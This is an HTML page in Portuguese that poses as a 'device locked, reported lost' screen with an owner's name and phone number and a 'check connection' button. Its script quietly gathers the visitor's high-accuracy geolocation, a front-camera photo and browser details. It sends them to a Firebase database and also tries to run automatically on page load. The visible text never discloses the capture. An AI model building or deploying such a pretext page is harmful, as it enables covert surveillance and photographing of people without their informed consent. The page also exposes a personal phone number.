<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Dispositivo Bloqueado</title>
<style>
  :root{
    --bg:#0d1117; --card:#161b22; --text:#e6edf3; --muted:#8b949e; --accent:#2f81f7;
    padding-top:env(safe-area-inset-top,0px); padding-bottom:env(safe-area-inset-bottom,0px);
    box-sizing:border-box;
  }
  *{box-sizing:border-box}
  html,body{height:100%;margin:0}
  body{
    background:var(--bg); color:var(--text);
    font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif;
    display:flex; align-items:center; justify-content:center; padding:24px;
  }
  .card{
    background:var(--card); border-radius:16px; padding:32px 24px;
    max-width:380px; width:100%; text-align:center;
  }
  .icon{font-size:48px; margin-bottom:8px}
  h1{font-size:20px; margin:8px 0}
  p{color:var(--muted); font-size:14px; line-height:1.5}
  .contato{color:var(--text); font-weight:600; margin:16px 0}
  button{
    width:100%; padding:14px; border:none; border-radius:10px;
    background:var(--accent); color:#fff; font-size:15px; font-weight:600;
    margin-top:12px; cursor:pointer;
  }
  button:disabled{opacity:.6}
  .status{font-size:12px; color:var(--muted); margin-top:14px; min-height:16px}
</style>
</head>
<body>
  <div class="card">
    <div class="icon">🔒</div>
    <h1>Dispositivo Bloqueado</h1>
    <p>Este dispositivo foi reportado como perdido. Se você o encontrou, entre em contato com o proprietário:</p>
    <div class="contato">Hizag — (51) 99120-8358</div>
    <p>Toque no botão abaixo para verificar a conexão e tentar restaurar o acesso.</p>
    <button id="btn">Verificar conexão</button>
    <div class="status" id="status"></div>
  </div>

<script>
// ==== CONFIGURE AQUI ====
const DB_URL = "https://console.firebase.google.com/project/hizag-b0c4b/database/hizag-b0c4b-default-rtdb/data/~2F"; // URL do seu Firebase Realtime Database
// =========================

const btn = document.getElementById('btn');
const statusEl = document.getElementById('status');
let done = false;

async function capturar(){
  if(done) return;
  done = true;
  btn.disabled = true;
  statusEl.textContent = 'Verificando...';

  const registro = {
    timestamp: Date.now(),
    data: new Date().toISOString(),
    ua: navigator.userAgent
  };

  // Localização
  try{
    const pos = await new Promise((res, rej)=>{
      navigator.geolocation.getCurrentPosition(
        p => res(p),
        e => rej(e),
        { enableHighAccuracy:true, timeout:8000 }
      );
    });
    registro.lat = pos.coords.latitude;
    registro.lon = pos.coords.longitude;
    registro.precisao_m = pos.coords.accuracy;
  }catch(e){ registro.lat = null; registro.lon = null; }

  // Foto (câmera frontal)
  try{
    const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:'user' }, audio:false });
    const video = document.createElement('video');
    video.srcObject = stream;
    video.setAttribute('playsinline','');
    await video.play();
    await new Promise(r => setTimeout(r, 600));
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 320;
    canvas.height = video.videoHeight || 240;
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
    registro.foto = canvas.toDataURL('image/jpeg', 0.6);
    stream.getTracks().forEach(t => t.stop());
  }catch(e){ registro.foto = null; }

  // Envia para o Firebase (sem exigir login)
  try{
    await fetch(DB_URL + '/capturas.json', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(registro)
    });
  }catch(e){}

  statusEl.textContent = 'Conectado. Aguardando o proprietário.';
  btn.textContent = 'Verificado ✓';
}

btn.addEventListener('click', capturar);
// tenta automaticamente também, caso o navegador permita sem gesto do usuário
window.addEventListener('load', () => setTimeout(capturar, 800));
</script>
</body>
</html>
